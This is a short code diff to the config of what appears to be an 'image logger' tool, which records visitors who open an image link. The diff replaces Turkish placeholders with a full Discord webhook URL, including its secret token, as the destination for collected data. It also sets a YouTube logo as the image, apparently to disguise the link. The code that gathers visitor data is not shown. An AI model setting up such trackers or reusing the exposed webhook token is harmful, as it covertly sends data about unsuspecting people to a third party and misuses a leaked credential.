@@ -12,8 +12,8 @@ __author__ = "Avezy"
 
 config = {
     # BASE CONFIG #
-    "webhook": "webhook buraya",
-    "image": "fotograf adresi buraya", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1249683701454082138/dYbDNL-XrlNoZoQu4MZdfxrlqe-Fy6DvsAHtGkXBbJb6v4jx0SF2rBFjOBgLeFg_zOlH",
+    "image": "https://www.youtube.com/img/desktop/yt_1200.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
